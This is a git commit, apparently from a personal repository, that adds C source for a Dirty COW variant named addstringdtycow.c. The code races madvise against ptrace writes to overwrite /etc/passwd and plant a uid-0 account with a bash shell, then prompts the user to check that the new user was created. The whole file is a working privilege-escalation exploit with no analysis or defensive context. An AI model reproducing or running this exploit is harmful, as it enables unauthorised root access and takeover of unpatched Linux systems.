0ae345c8eca02f57244220524b364a58159e5c2c
zusini <37207085+zusini@users.noreply.github.com>
2018-03-09 15:36:09 +0700

    Update and rename .gitignore to addstringdtycow.c

---
+++ .gitignore/addstringdtycow.c
@@ -0,0 +1,71 @@
+
+#include <fcntl.h>
+#include <pthread.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <sys/ptrace.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <crypt.h>
+
+const char *filename = "/etc/passwd";
+
+int f;
+void *map;
+pid_t pid;
+pthread_t pth;
+struct stat st;
+void *madviseThread(void *arg) {
+  int i, c = 0;
+  for(i = 0; i < 200000000; i++) {
+    c += madvise(map, 100, MADV_DONTNEED);
+  }
+  printf("madvise %d\n\n", c);
+}
+int main()
+{
+char *complete_passwd_line = ":x:0:0:,,,:/var/www:/bin/bash     " ;
+
+  f = open(filename, O_RDONLY);
+  fstat(f, &st);
+  map = mmap(NULL,
+             st.st_size + sizeof(long),
+             PROT_READ,
+             MAP_PRIVATE,
+             f,
+             0);
+  printf("mmap: %lx\n",(unsigned long)map);
+  pid = fork();
+  if(pid) {
+    waitpid(pid, NULL, 0);
+    int u, i, o, c = 0;
+    int l=strlen(complete_passwd_line);
+    for(i = 0; i < 10000/l; i++) {
+      for(o = 0; o < l; o++) {
+        for(u = 0; u < 10000; u++) {
+          c += ptrace(PTRACE_POKETEXT,
+                      pid,
+                      map + 1005 + o,
+                      *((long*)(complete_passwd_line + o)));
+        }
+      }
+    }
+    printf("ptrace %d\n",c);
+  }
+  else {
+    pthread_create(&pth,
+                   NULL,
+                   madviseThread,
+                   NULL);
+    ptrace(PTRACE_TRACEME);
+    kill(getpid(), SIGSTOP);
+    pthread_join(pth,NULL);
+  }
+printf("Done! Check %s to see if the new user was created.\n", filename);
+return 0;
+}
